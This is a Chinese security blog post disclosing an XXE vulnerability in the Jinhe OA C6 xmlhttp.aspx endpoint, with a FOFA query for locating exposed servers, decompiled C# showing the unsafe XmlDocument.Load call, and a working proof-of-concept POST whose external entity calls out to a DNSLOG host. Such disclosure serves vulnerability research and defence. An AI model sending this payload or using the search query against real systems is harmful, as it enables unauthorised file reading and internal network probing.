---
title: "金和OA JHSoft.Web.H5SiteControl/xmlhttp.aspx XXE漏洞"
source: https://mrxn.net/jswz/jhsoft-H5SiteControl-xmlhttp-xxe.html
asset_dir: assets/金和oa-jhsoft.web.h5sitecontrolxmlhttp.aspx-xxe漏洞
---

# 金和OA JHSoft.Web.H5SiteControl/xmlhttp.aspx XXE漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2026/1/30 13:31
- 188浏览
- [0评论](#comment)
- 8分钟阅读

深入探索

传输层安全性协议

安全运维咨询

Nessus

---

# 漏洞简介

金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。金和OA C6 `JHSoft.Web.H5SiteControl/xmlhttp.aspx` 接口处存在[XXE](https://mrxn.net/tag/XXE)漏洞，未授权的攻击者可以通过此漏洞读取服务器上敏感文件或探测内网服务信息，进一步利用可导致服务器失陷。

漏洞扫描服务

# 影响版本

金和OA C6

# fofa语法

> app="金和网络-金和OA"

# 漏洞分析

深入探索

数据库

文本剥离工具

软件

直接根据 `JHSoft.Web.H5SiteControl/xmlhttp.aspx` 在 `bin` 目录下查找 `JHSoft.Web.Groups.dll` 将其进行反编译后找到 **xmlhttp** 的处理逻辑

```
protected void Page_Load(object sender, EventArgs e)
{
  XmlDocument xmlDocument = new XmlDocument();
  xmlDocument.Load(this.Request.InputStream);
```

请求内容直接使 `XmlDocument.Load` 解析，造成[XXE](https://mrxn.net/tag/XXE)漏洞。

# 漏洞复现

```
POST /c6/JHSoft.Web.H5SiteControl/xmlhttp.aspx/ HTTP/1.1
Host: jhsoft.mrxn.net

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://xxe.dnslog.pt/xxe_test">
%remote;]>
<root/>
```

在DNSLOG平台成功收到请求

网络安全

[![金和OA JHSoft.Web.H5SiteControl/xmlhttp.aspx XXE漏洞](images/img-001-ab40f77f1ff8.webp)](https://image.mrxn.net/b12efeef8c1a4140adbccbbbda98c37e.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#0day](https://mrxn.net/tag/0day)
- [#XXE](https://mrxn.net/tag/XXE)
- [#asp.net](https://mrxn.net/tag/asp.net)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
